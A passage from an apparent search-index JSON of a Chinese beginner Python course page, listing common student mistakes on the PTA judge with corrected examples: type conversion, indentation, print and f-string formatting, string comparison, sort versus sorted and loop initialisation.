\u88ab\u52a0\u6570 \u8fd9\u79cd\u63d0\u793a\u4fe1\u606f\uff0c\u4f60\u5c31\u5565\u4e5f\u522b\u8f93\u51fa\uff0c\u4e0d\u8981\u753b\u86c7\u6dfb\u8db3\uff01 \u89e3\u51b3\u65b9\u6848\uff1a \u76f4\u63a5input()\u5c31\u884c\u4e86","title":"\u4e0d\u8981\u8f93\u51fa\u4efb\u4f55\u591a\u4f59\u7684\u63d0\u793a\u4fe1\u606f"},{"location":"PythonCourse/#input_1","text":"\u522b\u5fd8\u4e86\u628a\u5b57\u7b26\u4e32\u8f6c\u6210\u4f60\u9700\u8981\u7684\u7c7b\u578b\uff0c\u6bd4\u5982int() \u5b57\u7b26\u4e32\u52a0\u5b57\u7b26\u4e32\u662f\u62fc\u63a5\uff0c \u5b57\u7b26\u4e32\u4e0d\u80fd\u548c\u6574\u6570\u76f8\u52a0 >>> \"1\"+\"2\" '12' >>> 1+2 3 >>> \"1\"+2 Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: can only concatenate str (not \"int\") to str","title":"input\u51fd\u6570\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32"},{"location":"PythonCourse/#int-c","text":"\u8fd9\u662fC\u8bed\u8a00\u7684\u8bed\u6cd5\uff0cPython\u4e0d\u652f\u6301 sum = (int)x + (int)y \u5e94\u8be5\u5199\uff1a sum = int(x) + int(y) \u53e6\u5916 \u4e0d\u5efa\u8bae\u547d\u540d\u4e3asum\uff0c\u56e0\u4e3asum\u672c\u8eab\u662fPython\u7684\u5185\u7f6e\u51fd\u6570 \u4f60\u8d4b\u503c\u4e86\u5c31\u4e0d\u80fd\u518d\u8c03\u7528\u539f\u6765\u7684sum\u51fd\u6570\u4e86 \u5982\u679c\u4f60\u8986\u76d6\u4e86sum\u4e4b\u540e\u518d\u53bb\u8c03\u7528sum\u51fd\u6570 \u4f1a\u62a5\u9519 >>> sum=1 >>> sum([1,2]) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: 'int' object is not callable \u4f60\u8fd8\u53ef\u4ee5\u8fd9\u4e48\u505a\uff1a\u7528map\u548c\u5217\u8868\u63a8\u5bfc\u5f0f s = sum(map(int, [x,y])) s = sum([int(i) for i in [x,y]])","title":"\u6ce8\u610f\u7c7b\u578b\u8f6c\u6362\u7684int\u662f\u8981\u8c03\u7528\u7684 \u548cC\u8bed\u8a00\u4e0d\u4e00\u6837"},{"location":"PythonCourse/#_4","text":"a,b,c=map(int,(input().split()) \u591a\u4e86\u4e00\u4e2a(\uff0c \u7ec6\u5fc3\u4e00\u70b9\u5373\u53ef \u62a5\u9519\uff1a SyntaxError : unexpected EOF while parsing","title":"\u6ce8\u610f\u62ec\u53f7\u7684\u5339\u914d"},{"location":"PythonCourse/#_5","text":"a,b,c=input().split \u672b\u5c3e\u5c11\u4e86() \u62a5\u9519\uff1a Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: cannot unpack non-iterable builtin_function_or_method object","title":"\u65b9\u6cd5\u662f\u9700\u8981\u8c03\u7528\u7684"},{"location":"PythonCourse/#_6","text":"s=\"Python\u8bed\u8a00\u7b80\u5355\u6613\u5b66\" print(s) \u7b2c\u4e8c\u884c\u591a\u4e86\u524d\u9762\u7684\u7a7a\u683c\uff0c\u4f1a\u62a5\u9519\uff1a File \"<stdin>\", line 1 print(s) ^ IndentationError: unexpected indent","title":"\u6ce8\u610f\u7f29\u8fdb \u4e0d\u80fd\u6709\u591a\u4f59\u7a7a\u683c"},{"location":"PythonCourse/#print","text":"\u9519\u8bef\u793a\u4f8b\uff1a print(sum = s) \u4f60\u8981\u7ad9\u5728\u8bed\u8a00\u5f00\u53d1\u8005\u7684\u89d2\u5ea6\u601d\u8003\uff0c\u4f60\u62ec\u53f7\u91ccsum\u8868\u793a\u7684\u662f\u5b57\u9762\u610f\u601d\u4e0a\u7684\u201dsum\u201d\u5b57\u7b26\u4e32\u5462\u8fd8\u662f\u5185\u7f6e\u7684sum\u51fd\u6570\u5462\uff1f\u8bed\u8a00\u7684\u8bbe\u8ba1\u8981\u4fdd\u8bc1\u6ca1\u6709\u6b67\u4e49 \u6b63\u786e\u7684\u5199\u6cd5\uff1a\u9700\u8981\u539f\u6837\u8f93\u51fa\u7684\u90fd\u8981\u52a0\u4e0a\u5f15\u53f7\uff01 print ( \"sum =\" , s ) \u8fd9\u4e2a\u9898\u76ee\u8981\u6c42\u7b49\u53f7\u4e24\u8fb9\u6709\u7a7a\u683c\uff0c\u5982\u679c\u6ca1\u6709\u6ce8\u610f\u5230\u8fd9\u4e00\u70b9\u4f1a \u683c\u5f0f\u9519\u8bef print\u53ef\u4ee5\u63a5\u53d7\u4e0d\u5b9a\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5728\u8f93\u51fa\u7684\u65f6\u5019 \u6bcf\u4e2a\u53c2\u6570\u4e4b\u95f4\u4f1a\u52a0\u4e0a\u7a7a\u683c \uff0c\u6240\u4ee5\u4e0a\u8ff0\u5b57\u7b26\u4e32\u91cc\u7b49\u53f7 \u53f3\u8fb9\u662f\u4e0d\u5199\u7a7a\u683c \u7684","title":"print\u7684\u7528\u6cd5"},{"location":"PythonCourse/#f-string","text":"\u4e0a\u8ff0\u5199\u6cd5\u53ef\u4ee5\u66ff\u6362\u6210\uff1a print ( f \"sum = { s } \" ) \u6ce8\u610f\u5230\u5b57\u7b26\u4e32\u5f15\u53f7\u524d\u9762\u7684f\uff0c\u8bf4\u660e\u8fd9\u4e2a\u5b57\u7b26\u4e32\u662f\u4e00\u4e2a\u6a21\u677f\uff0cPython\u9047\u5230\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4f1a\u81ea\u52a8\u628as\u7684\u503c\u586b\u8fdb\u53bb\u3002 f-string\u5728Python3.7\u91cc\u9762\u5f15\u5165\uff0cPTA\u662f\u652f\u6301\u7684\uff0c\u5982\u679c\u4f60\u7684Python\u7248\u672c\u4f4e\u4e8e3.7\uff0c\u4f60\u53ef\u4ee5\u7528\u8fd9\u4e9b\u901a\u7528\u7684\u5199\u6cd5\uff08\u53ea\u662f\u4e0d\u591f\u7f8e\u89c2\u4e86\uff09\uff1a print ( \"sum = {} \" . format ( s )) # \u9700\u8981\u8bb0\u6e05\u695a\u591a\u4e2a\u53d8\u91cf\u4e4b\u95f4\u7684\u987a\u5e8f print ( \"sum = {s} \" . format ( s = s )) # \u6bcf\u4e2a\u53d8\u91cf\u90fd\u8981\u5199\u4e00\u904d print ( \"sum = {s} \" . format ( ** locals ())) # \u76f4\u63a5\u628a\u6240\u6709\u5c40\u90e8\u53d8\u91cf\u90fd\u63d0\u4f9b\u7ed9format \u5c31\u4e0d\u7528\u81ea\u5df1\u5199\u4e86 # \u5982\u679c\u7528\u5728\u51fd\u6570\u91cc\uff0c\u4f60\u53ef\u80fd\u60f3\u8f93\u51fa\u5168\u5c40\u53d8\u91cf\uff0c\u672a\u5b8c\u5f85\u7eed","title":"\u4f60\u8fd8\u53ef\u4ee5\u4f7f\u7528f-string"},{"location":"PythonCourse/#_7","text":"\u9519\u8bef\u793a\u4f8b \u770b\u770b\u5f15\u53f7\u7684\u7ed3\u675f\u4f4d\u7f6e print(f'f({x:.1f}) = {1/x:.1f'}) \u6b63\u786e\u7684\u5199\u6cd5\u662f print ( f 'f( { x : .1f } ) = { 1 / x : .1f } ' )","title":"\u6ce8\u610f\u5f15\u53f7\u62ec\u53f7\u7684\u5339\u914d\uff0c\u5c24\u5176\u662f\u53d8\u5f97\u590d\u6742\u7684\u65f6\u5019"},{"location":"PythonCourse/#forifelse","text":"\u9519\u8bef\u793a\u4f8b num = float ( input ()) if num < 0 : print ( 'Invalid Value!' ) elif num <= 50 : cost = num * 0.53 print ( \"cost = %.2f \" % cost ) else : cost = 50 * 0.53 + ( num - 50 ) * ( 0.05 + 0.53 ) print ( \"cost = %.2f \" % cost ) elif\u91cc\u9762\u7684print\u6ca1\u6709\u7f29\u8fdb\uff0celse\u5fc5\u987b\u548celif\u548cif\u5e73\u7ea7\uff0c\u4e4b\u95f4\u7684\u4ee3\u7801\u5fc5\u987b\u66f4\u591a\u7f29\u8fdb \u4fee\u6539\u65b9\u6cd5\uff1a\u53bb\u6389\u4e0a\u9762\u7684print\u6216\u8005\u4e24\u5904print\u90fd\u589e\u52a0\u7f29\u8fdb","title":"for,if,else\u53f3\u8fb9\u90fd\u8981\u6709\u5206\u53f7\uff0c\u6bcf\u4e2a\u5206\u53f7\u7684\u4e0b\u4e00\u884c\u589e\u52a0\u7f29\u8fdb"},{"location":"PythonCourse/#_8","text":"\u987a\u5e26\u5f3a\u8c03\u4e0d\u8981\u5728PTA\u91cc\u89e3\u9898\uff0c\u5148\u53bbPython IDLE\u6216\u8005thonny\u91cc \u672c\u5730\u505a\u51fa\u6765\u518d\u590d\u5236\u7c98\u8d34\u63d0\u4ea4 \u4f60\u7684\u6bcf\u6b21\u9519\u8bef\u63d0\u4ea4\u6211\u90fd\u4f1a\u770b\uff0c\u4f60\u53cd\u590d\u51fa\u73b0\u540c\u4e00\u6b21\u9519\u8bef\u8ba9\u6211\u5f88\u70e6 \u4f60\u4fe1\u4e0d\u4fe1\u8fd9\u4e2a\u9519\u8bef\u4e0b\u6b21\u4f5c\u4e1a\u8fd8\u4f1a\u51fa\u73b0 \u9519\u8bef\u793a\u4f8b if \uff08 x < 0 \uff09 : print ( \"Invalid Value!\" ) Python\u7684if\u4e5f\u4e0d\u9700\u8981\u62ec\u53f7\uff0c\u76f4\u63a5\u5199\u5c31\u884c if x < 0 : print ( \"Invalid Value!\" )","title":"\u7ee7\u7eed\u5f3a\u8c03 \u4e0d\u8981\u51fa\u73b0\u4e2d\u6587\u62ec\u53f7"},{"location":"PythonCourse/#return-0","text":"\u5982\u679c\u4f60\u4e00\u5b9a\u8981\u8ba9\u7a0b\u5e8f\u7acb\u523b\u9000\u51fa\uff0c\u7528 exit(0) \uff0c\u6548\u679c\u7b49\u4ef7\u4e8eC\u8bed\u8a00main\u51fd\u6570\u91cc return 0;","title":"\u4e0d\u8981\u51fa\u73b0return 0"},{"location":"PythonCourse/#_9","text":"","title":"\u770b\u6e05\u9898\u76ee"},{"location":"PythonCourse/#int","text":"\u9898\u76ee\u8bf4 \u8f93\u5165\u5728\u4e00\u884c\u4e2d\u7ed9\u51fa \u5b9e\u6570 x \u4f60\u9700\u8981 float(input())","title":"\u8f93\u5165\u5b9e\u6570\u522b\u7528int()"},{"location":"PythonCourse/#_10","text":"\u6bd4\u5982\u9898\u76ee\u8f93\u5165\u7684\u4f8b\u5b50\u662f\u8fd9\u6837\u7684 1, 5 \u4f60\u5c31\u4e0d\u80fd\u7528 a,b=input().split() \u800c\u5e94\u8be5 a,b=input().split(',') \u4e5f\u4e0d\u5e94\u8be5\u4e24\u6b21input()\uff0c\u53ea\u6709\u8f93\u5165\u662f\u4e24\u884c\u7684\u65f6\u5019\u624d\u80fd\u8c03\u7528\u4e24\u6b21input","title":"\u770b\u6e05\u9898\u76ee\u8f93\u5165\u7684\u683c\u5f0f"},{"location":"PythonCourse/#_11","text":"\u9898\u76ee\u8bf4 lower\u2264upper\u2264100\uff0c\u90a3\u4e48\u80af\u5b9a\u5c31\u4f1a\u6709\u6d4b\u8bd5\u70b9lower\u7b49\u4e8eupper\uff0c\u8fd9\u662f\u7b26\u5408\u8981\u6c42\u7684 \u4e0d\u8981\u9519\u8bef\u7684\u8f93\u51fa\u4e86 Invalid.","title":"\u770b\u6e05\u9898\u76ee\u7684\u5141\u8bb8\u8303\u56f4"},{"location":"PythonCourse/#_12","text":"\u81ea\u5df1\u8f93\u5165\u5c31\u5bb9\u6613\u51fa\u9519\uff0c\u4ece\u9898\u76ee\u590d\u5236\u591a\u7b80\u5355","title":"\u590d\u5236\u7c98\u8d34\u9898\u76ee\u7684\u6587\u672c\u5c31\u884c \u4e0d\u8981\u81ea\u5df1\u6572"},{"location":"PythonCourse/#_13","text":"cost = float ( input ()) print ( \"Invalid Value!\" if m < 0 else \"cost = \" + str ( format ( 0.53 * cost + ( 0 if cost <= 50 else 0.05 * ( cost - 50 )), '.2f' ))) \u4ee3\u7801\u662f\u7ed9\u4eba\u770b\u7684\uff0c\u8fd9\u79cd\u5199\u6cd5\u4e0d\u5bb9\u6613\u770b\u51fa\u54ea\u91cc\u51fa\u9519\u4e86\uff0c\u8001\u8001\u5b9e\u5b9e\u5199if\u5457 \u8fd9\u4e2a\u9519\u8bef\u662f\u672a\u5b9a\u4e49\u7684m \u53e6\u5916\u53d8\u91cf\u7684\u547d\u540d\uff0c\u9898\u76ee\u8f93\u5165\u7684\u662f\u7535\u91cf\uff0c\u4e0ecost\u547d\u540d\u4e0d\u4e00\u81f4\uff0c\u8fd9\u4f1a\u8ba9\u8bfb\u8005\u56f0\u60d1\uff08\u8bfb\u8005\u5f88\u6709\u53ef\u80fd\u5c31\u662f\u4ee5\u540e\u7684\u4f60\uff0c\u4e0d\u8981\u7ed9\u81ea\u5df1\u6316\u5751\uff09","title":"\u4e0d\u8981\u8ffd\u6c42\u4e00\u884c\u5199\u5b8c"},{"location":"PythonCourse/#_14","text":"\u9519\u8bef\u5199\u6cd5\uff1a 2i \u62a5\u9519 SyntaxError: invalid syntax \u6b63\u786e\u5199\u6cd5\uff1a 2*i \u9519\u8bef\u5199\u6cd5\uff1a area=sqrt(s(s\u2212a)(s\u2212b)(s\u2212c)) \u62a5\u9519 TypeError: 'int' object is not callable \u6b63\u786e\u5199\u6cd5\uff1a area=sqrt(s*(s\u2212a)*(s\u2212b)*(s\u2212c))","title":"\u4e58\u6cd5\u8981\u5199\u4e58\u53f7"},{"location":"PythonCourse/#int_1","text":"\u4f60\u9700\u8981\u7ed9\u51fa\u6b63\u786e\u7684\u7c7b\u578b \u5426\u5219\u62a5\u9519\uff1a >>> int ( \"100\" , 2 ) 4 >>> int ( 100 , 2 ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > TypeError : int () can 't convert non-string with explicit base >>> int ( \"100\" , \"2\" ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > TypeError : 'str' object cannot be interpreted as an integer","title":"int\u7528\u4f5c\u8fdb\u5236\u8f6c\u6362 \u53c2\u6570\u662f \u5b57\u7b26\u4e32,\u6574\u6570"},{"location":"PythonCourse/#join","text":"\u4f60\u4e0d\u80fd \",\".join([1,2,3]) \u4f1a\u62a5\u9519\uff1a TypeError: sequence item 0: expected str instance, int found \u4f60\u53ef\u4ee5\u5148\u8f6c\u6362\u6210str\uff1a \",\".join([str(i) for i in [1,2,3]])","title":"\u5b57\u7b26\u4e32\u7684join \u9700\u8981\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u5b57\u7b26\u4e32"},{"location":"PythonCourse/#_15","text":"\u9898\u76ee\u8bf4\u7684 \u8f93\u51fa\u683c\u5f0f \u8981\u8ba4\u771f\u4f53\u4f1a \u9996\u5148\u987a\u5e8f\u8f93\u51fa\u4eceA\u5230B\u7684\u6240\u6709\u6574\u6570\uff0c\u6bcf5\u4e2a\u6570\u5b57\u5360\u4e00\u884c\uff0c\u6bcf\u4e2a\u6570\u5b57\u53605\u4e2a\u5b57\u7b26\u5bbd\u5ea6\uff0c\u5411\u53f3\u5bf9\u9f50\u3002\u6700\u540e\u5728\u4e00\u884c\u4e2d\u6309Sum = X\u7684\u683c\u5f0f\u8f93\u51fa\u5168\u90e8\u6570\u5b57\u7684\u548cX\u3002 -3 -2 -1 0 1 2 3 4 5 6 7 8 Sum = 30 \u4f60\u8003\u8651\u5230\u6700\u540e\u4e00\u884c\u6b63\u597d\u51d1\u6ee15\u4e2a\u6574\u6570\uff0c\u4f60\u4f1a\u591a\u8f93\u51fa\u4e00\u4e2a\u7a7a\u884c\u5417\uff1f \u53e6\u5916\u8fd9\u4e2a\u9898\u76ee\u6697\u542b\u7740 \u6bcf\u884c\u672b\u5c3e\u4e0d\u80fd\u6709\u7a7a\u683c \u7684\u8981\u6c42\uff0c\u4f60\u80fd\u7528 end=' ' \u5417?","title":"\u6ce8\u610f\u8fb9\u7f18\u60c5\u51b5"},{"location":"PythonCourse/#_16","text":"\u4e0d\u8981\u6ee1\u8db3\u4e8e\u9898\u76ee\u7ed9\u7684\u6837\u4f8b\uff0c\u53d1\u6325\u4e3b\u89c2\u80fd\u52a8\u6027\u81ea\u5df1\u9020\u6570\u636e\u770b\u770b\uff0c\u6bd4\u5982\u8fb9\u754c\u503c\uff08\u6700\u5927\u6700\u5c0f\uff09\u3001\u9519\u8bef\u503c","title":"\u5b66\u4f1a\u81ea\u5df1\u9020\u6570\u636e"},{"location":"PythonCourse/#_17","text":"\u4f8b\u5982\u67e5\u9a8c\u8eab\u4efd\u8bc1\u7684\u9898\u76ee\uff0c\u8f93\u51fa\u683c\u5f0f\u7684\u8981\u6c42\u662f\uff1a \u6309\u7167\u8f93\u5165\u7684\u987a\u5e8f \u6bcf\u884c\u8f93\u51fa1\u4e2a\u6709\u95ee\u9898\u7684\u8eab\u4efd\u8bc1\u53f7\u7801 \u90a3\u4f60\u5c31\u4e0d\u80fd\u8fd9\u4e48\u5199\u4e24\u6b21\u5faa\u73af\uff0c\u4e00\u904d\u8f93\u51fa\u524d17\u4f4d\u6709\u975e\u6570\u5b57\u7684\uff0c\u4e00\u904d\u8f93\u51fa\u6821\u9a8c\u4f4d\u4e0d\u5bf9\u7684\uff0c\u53ea\u80fd\u4e00\u6b21\u5faa\u73af\u5b8c\u6210 \u867d\u7136\u4e24\u6b21\u5faa\u73af\u903b\u8f91\u4e0a\u662f\u5bf9\u7684\uff0c\u5374\u6ca1\u80fd\u6ee1\u8db3\u9898\u76ee\u7684\u8981\u6c42\uff0c\u5c31\u7b54\u6848\u9519\u8bef\u4e86\uff1b\u6070\u597d\u9898\u76ee\u7684\u6837\u4f8b\u662f\u5148\u975e\u6570\u5b57\u9519\u8bef\u518d\u6821\u9a8c\u4f4d\u9519\u8bef\uff0c\u4f46\u8fd9\u53ea\u662f\u4e2a\u6837\u4f8b\uff0c \u6837\u4f8b\u91cc\u7684\u89c4\u5f8b\u53ea\u8981\u4eba\u5bb6\u6ca1\u8bf4\u4e00\u5f8b\u4e0d\u7b97\u6570\u7684\uff01","title":"\u6ce8\u610f\u8f93\u51fa\u683c\u5f0f\u5bf9\u987a\u5e8f\u7684\u8981\u6c42"},{"location":"PythonCourse/#_18","text":"\u6700\u7b80\u5355\u7684\u65b9\u5f0f\uff1a x.isdigit() \u4e5f\u53ef\u4ee5\uff1a \u20180\u2019<=x<=\u20189\u2019 \u4e0d\u5efa\u8bae\u7684\u65b9\u5f0f\uff1a 48<=ord(x)<=57 \u4f60\u4e0d\u662f\u5728\u5199C\u8bed\u8a00\uff0c\u6ca1\u5fc5\u8981\u8f6c\u6362\u4e3a\u6574\u6570\u5224\u65ad \u9644\u5e26\u77e5\u8bc6\u70b9\uff1apython\u91cc a<x<b \u7b49\u4ef7\u4e8e a<x and x<b","title":"\u5982\u4f55\u5224\u65ad\u4e00\u4e2a\u5b57\u7b26\u662f\u6574\u6570\uff1f"},{"location":"PythonCourse/#_19","text":"\u8fd9\u4e2a\u4e1c\u897f\u662fTrue\u8fd8\u662fFalse? \"2\">\"11\" \u7b54\u6848\u662fTrue\uff0c\u9707\u60ca\uff012\u5c45\u7136\u6bd411\u5927\uff1f\uff01 \u6ce8\u610f\u8fd9\u662f\u4e24\u4e2a \u5b57\u7b26\u4e32\u4e4b\u95f4\u7684\u6bd4\u8f83 \uff0c\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83\u89c4\u5219\u662f \u9010\u5b57\u7b26\u6bd4\u8f83\uff0c\u76f8\u540c\u5c31\u7ee7\u7eed\u6bd4\u8f83\uff0c\u9047\u5230\u4e00\u4e2a\u4e0d\u76f8\u540c\u5c31\u5f97\u51fa\u6700\u7ec8\u7684\u6bd4\u8f83\u7ed3\u8bba \u3002 \u8fd9\u91cc\u6bd4\u8f83\u7b2c\u4e00\u4e2a\u5b57\u7b262\u548c1\uff0c2\u662f\u5927\u4e8e1\u7684\uff0cok\u6bd4\u8f83\u5b8c\u6210 \u201c2\u201d>\u201d11\u201d\u3002 \u540c\u7406 \u201c2\u201d>\u201d199999999\u201d\uff0c\u65e0\u8bba9\u6709\u591a\u5c11\u4e2a\u90fd\u4e0d\u4f1a\u53c2\u4e0e\u6bd4\u8f83\u3002 \u4e3e\u4e00\u53cd\u4e09\uff1amax(\u201c8\u201d, \u201c9\u201d, \u201c10\u201d)\u662f\u591a\u5c11\uff1f \u5f53\u9898\u76ee\u8981\u6c42\u6574\u6570\u7684\u6392\u5e8f\u7684\u65f6\u5019\uff0c\u4e00\u5b9a\u8981\u7528int\u8f6c\u6210\u6574\u6570","title":"\u5b57\u7b26\u4e32\u6bd4\u8f83\u5927\u5c0f\u662f\u4e2a\u5751"},{"location":"PythonCourse/#sortsorted","text":"x = [ 3 , 1 , 2 ] for i in x . sort (): print ( i , end = ' ' ) \u4e0a\u8ff0\u4ee3\u7801\u6b63\u786e\u5417\uff1f\u4f1a\u8f93\u51fa 1 2 3 \u561b\uff1f .sort()\u8fd4\u56de\u7684\u662fNone\uff0c\u4e0d\u80fd\u7528\u6765\u8fed\u4ee3\uff1b\u8fd9\u662f\u4e00\u4e2a\u539f\u5730\u6392\u5e8f\uff0c\u76f4\u63a5\u4fee\u6539\u539f\u6570\u7ec4\uff0c\u4e0d\u4f1a\u521b\u5efa\u65b0\u7684\u6570\u7ec4 \u5bf9\u4e8e\u4e0a\u8ff0\u4ee3\u7801\uff0c\u4f60\u9700\u8981\u7528sorted(x)\uff1b\u8fd9\u4e0d\u4f1a\u4fee\u6539\u539f\u6570\u7ec4\uff0c\u800c\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4 x = [ 3 , 1 , 2 ] for i in sorted ( x ): print ( i , end = ' ' ) print ( x ) \u8f93\u51fa\u662f 1 2 3 [3, 1, 2] \uff0c\u53ef\u4ee5\u770b\u51fa\u4f7f\u7528sorted\u4e0d\u4f1a\u4fee\u6539\u539f\u6765\u7684x","title":"\u533a\u5206.sort()\u548csorted"},{"location":"PythonCourse/#_20","text":"","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4eec"},{"location":"PythonCourse/#52f","text":">>> \" %5.2f \" % 1.2 ' 1.20' >>> \" {:5.2f} \" . format ( 1.2 ) ' 1.20' >>> \" {:>5.2f} \" . format ( 1.2 ) ' 1.20' \u70b9\u5c31\u662f\u5c0f\u6570\u70b9\uff0c\u70b92\u5c31\u662f\u5c0f\u6570\u70b9\u540e\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\uff0c\u524d\u9762\u8fd8\u6709\u4e00\u4e2a5\u662f\u5565\u5462\uff0c\u8868\u793a\u6574\u4f53\u4e0d\u591f5\u4f4d\u5c31\u5de6\u8fb9\u7528\u7a7a\u683c\u8865\u9f505\u4f4d\uff0c\u6ce8\u610f\u4e0a\u8ff0\u8f93\u51fa\u5de6\u8fb9\u662f\u6709\u4e00\u4e2a\u7a7a\u683c\u7684\u3002 \u5982\u679c\u7528format\uff0c\u53ef\u4ee5\u770b\u51fa\u5199\u6cd5\u57fa\u672c\u76f8\u540c\uff0c\u8fd9\u662f\u53f3\u5bf9\u9f50\u7528 > >>> \" %-5.2f \" % 1.2 '1.20 ' >>> \" {:<5.2f} \" . format ( 1.2 ) '1.20 ' \u52a0\u4e86\u4e00\u4e2a\u8d1f\u53f7\uff0c\u53d8\u6210\u4e86\u53f3\u8fb9\u8865\u7a7a\u683c\uff1b\u8fd9\u662f\u5de6\u5bf9\u9f50\u6240\u4ee5\u7528 <","title":"\"%5.2f\"\u662f\u5565\u610f\u601d"},{"location":"PythonCourse/#_21","text":">>> \" {:^7s} \" . format ( \"xyz\" ) ' xyz ' \u90a3\u5c31\u7528^\u5457\uff0c\u8fd9\u662f\u6309Shift+6\u6309\u51fa\u6765\u7684\u7b26\u53f7","title":"\u90a3\u6211\u8981\u5c45\u4e2d\u600e\u4e48\u529e"},{"location":"PythonCourse/#_22","text":"\" {:d}{:>6.1f} \" . format ( fahr , celsius ) \u8fd9\u91cc\u6709\u4e24\u4e2a\u53d8\u91cf\u8981\u8f93\u51fa\uff0c\u6240\u4ee5\u8981\u4e24\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u60f3\u8f93\u51fa\u51e0\u4e2a\u53d8\u91cf\u5c31\u8981\u5199\u51e0\u4e2a"},{"location":"PythonCourse/#thonny","text":"\u5728\u4e0a\u534a\u90e8\u5206\u5199\u4ee3\u7801\uff0c\u6539\u4ee3\u7801\uff0c\u6309F5\u6267\u884c\u540e \u5728\u4e0b\u534a\u90e8\u5206Shell\u91cc\u8f93\u5165\u7528\u6237\u7684\u8f93\u5165\uff0c\u67e5\u770b\u8f93\u51fa \u4e0d\u8981\u5728\u5b83\u7684Shell\u91cc\u6572\u5165\u4ee3\u7801\uff0c\u56e0\u4e3a\u5b83\u4e0d\u652f\u6301\u591a\u6761\u8bed\u53e5","title":"Thonny\u7684\u7528\u6cd5"},{"location":"PythonCourse/#_23","text":"\u6bd4\u5982\u9898\u76ee\u8981\u6c42\u6ca1\u6709\u9519\u8bef\u7684\u8eab\u4efd\u8bc1\u5c31\u8f93\u51faAll Passed!\uff0c\u4e0b\u9762\u7684\u4f2a\u4ee3\u7801\u9519\u5728\u54ea\uff1f \u5bf9\u6bcf\u4e00\u4e2a\u8eab\u4efd\u8bc1 : flag = 1 #1\u8868\u793a\u6ca1\u9519 if \u8eab\u4efd\u8bc1\u9519\u4e86 : flag = 0 #\u53ea\u8981\u6709\u4e00\u4e2a\u9519\u4e86 flag\u7f6e0 if flag : print ( \"All Passed!\" ) flag=1\u662f\u4e00\u4e2a\u521d\u59cb\u5316\u8bed\u53e5\uff0c\u653e\u5728\u5faa\u73af\u91cc\u9762\u5c31\u4f1a\u5bfc\u81f4\u6bcf\u6b21\u5faa\u73af\u90fd\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5c31\u53d8\u6210\u4e86\u53ea\u8981\u6700\u540e\u4e00\u4e2a\u8eab\u4efd\u8bc1\u6ca1\u9519\u6700\u540eflag\u5c31\u662f1\uff0c\u4f60\u4f1a\u9519\u8bef\u7684\u8f93\u51faAll Passed! \u53d8\u91cf\u7684\u521d\u59cb\u5316\u9700\u8981\u5728\u8fdb\u5165\u5faa\u73af\u4e4b\u524d\u505a\u5b8c","title":"\u521d\u59cb\u5316\u80fd\u5728\u5faa\u73af\u4f53\u5185\u5417\uff1f"},{"location":"PythonCourse/#_24","text":"\u9898\u76ee\u8981\u6c42\u5b9e\u73b0aa+aaaa+\u2026+aaa\u2026\u2026a(n\u4e2aa)\u6c42\u548c \u62c6\u5206\u6210\u4e24\u4e2a\u95ee\u9898\uff1a\u600e\u4e48\u5f97\u5230n\u4e2aa\uff1f \u600e\u4e48\u5faa\u73af\u4ece2\u5230n\u6c42\u548c\uff1f \u4e0d\u8981\u628a\u8fd9\u4e24\u4e2a\u95ee\u9898\u6df7\u5728\u4e00\u8d77\u601d\u8003\uff0c\u5982\u679c\u4f60\u4e0d\u77e5\u9053\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u4e58\u4ee5\u6574\u6570\uff0c\u90a3\u4f60\u53ef\u4ee5\u5148\u5047\u8bbe\u6709\u8fd9\u4e48\u4e00\u4e2a\u51fd\u6570getna(n, a)\uff0c\u7d2f\u52a0\u5c31\u662f\uff1a a = '5' n = 4 #\u5b9e\u9645\u4e0a\u9700\u8981input()\uff0c\u6211\u4eec\u8fd9\u91cc\u5c31\u76f4\u63a5\u5199\u4e86 \u9700\u8981\u8ba1\u7b9755+5555 s = 0 for i in range ( 2 , n + 1 , 2 ): s += getna ( a , i ) \u7136\u540e\u6211\u4eec\u518d\u53bb\u5b9e\u73b0getna\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c31\u5e72\u4e00\u4ef6\u4e8b\u60c5\u2014\u2014\u8f93\u5165a\u548cn\uff0c\u8f93\u51faaaa\u2026a(n\u4e2aa)\u8fd9\u4e48\u4e00\u4e2a\u6574\u6570 \u8f93\u5165a=\u20185\u2019,n=4\uff0c\u8f93\u51fa5555 \u8fd9\u6b21\u6211\u7528\u5faa\u73af\u4e58\u6cd5\uff0c\u53ef\u4ee5\u770b\u6210 5 + 5*10 + 5*10*10 + 5*10*10*10 \u6bcf\u6b21\u5faa\u73af\u90fd\u662f5\u4e58\u4ee5\u4e00\u4e2a\u6570\uff0c\u8fd9\u4e2a\u6570\u4ece1\u5f00\u59cb \u6bcf\u6b21\u5faa\u73af\u540e\u4e58\u4ee510 def getna ( a , n ): # \u8fd9\u91cc\u6211\u4eec\u9700\u8981a\u4e5f\u662f\u4e00\u4e2a\u6574\u6570 a , n = int ( a ), int ( n ) #\u9632\u5fa1\u6027\u7f16\u7a0b\uff0c\u4f60\u4e0d\u77e5\u9053\u8c03\u7528\u8005\u662f\u5426\u7ed9\u4e86\u9700\u8981\u7684\u7c7b\u578b\uff0c\u53cd\u6b63\u8f6c\u6362\u4e00\u4e0b\u4e0d\u8d39\u4e8b multiply = 1 res = 0 for i in range ( n ): res += a * multiply multiply *= 10 return res \u6d4b\u8bd5\u4e00\u4e0b\u81ea\u5df1\u5bf9\u4e0d\u5bf9\uff1a >>> getna ( \"5\" , 4 ) 5555 \u6700\u540e\u628a\u4e24\u90e8\u5206\u62fc\u8d77\u6765\u5c31\u884c\u54af def getna ( a , n ): # 